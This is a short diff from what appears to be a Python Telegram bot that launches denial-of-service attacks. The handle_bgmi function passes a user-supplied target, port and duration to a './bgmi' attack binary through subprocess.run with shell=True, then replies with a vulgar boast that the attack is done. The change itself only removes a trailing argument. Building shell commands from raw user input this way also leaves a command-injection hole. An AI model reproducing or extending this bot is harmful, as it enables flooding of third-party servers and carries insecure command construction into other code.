@@ -309,7 +309,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/jonysins', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 10"
+                full_command = f"./bgmi {target} {port} {time}"
                 process = subprocess.run(full_command, shell=True)
                 response = f"[𝘼𝙩𝙩𝙖𝙘𝙠 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙] 😈BAHAN KE LODE FEEDBACK DEDE AB KYA MA CHUDATA RAHEGA ATTACK LAGA LAGA KE 😈"
                 #bot.reply_to(message, response)  # Notify the user that the attack is finished
